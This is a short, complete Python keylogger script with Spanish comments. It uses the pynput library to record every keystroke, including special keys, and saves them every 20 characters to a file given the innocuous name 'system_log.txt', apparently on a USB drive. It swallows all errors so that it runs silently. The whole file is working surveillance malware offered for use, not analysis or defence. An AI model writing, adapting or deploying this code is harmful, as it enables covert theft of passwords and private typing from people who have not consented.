import os
import time
import sys
from pynput import keyboard

class SimpleKeylogger:
    def __init__(self):
        self.log = ""
        # Guardar en el directorio actual (USB)
        self.filename = "system_log.txt"
        self.setup_logfile()
        
    def setup_logfile(self):
        """Crear el archivo de log si no existe"""
        try:
            if not os.path.exists(self.filename):
                with open(self.filename, "w") as f:
                    f.write(f"Keylogger started: {time.ctime()}\n")
                    f.write("=" * 50 + "\n")
        except Exception as e:
            pass
    
    def on_press(self, key):
        try:
            # Caracteres normales
            self.log += str(key.char)
        except AttributeError:
            # Teclas especiales
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n[ENTER]\n"
            elif key == keyboard.Key.tab:
                self.log += "[TAB]"
            elif key == keyboard.Key.backspace:
                self.log += "[BACKSPACE]"
            else:
                self.log += f"[{str(key)}]"
        
        # Guardar cada 20 caracteres
        if len(self.log) > 20:
            self.save_log()
    
    def save_log(self):
        try:
            with open(self.filename, "a", encoding="utf-8") as f:
                f.write(self.log)
            self.log = ""
        except Exception as e:
            pass
    
    def start(self):
        try:
            # Mantener el programa corriendo
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as e:
            # Si hay error, guardar lo que haya en log
            self.save_log()

if __name__ == "__main__":
    # Ejecutar el keylogger
    logger = SimpleKeylogger()
    logger.start()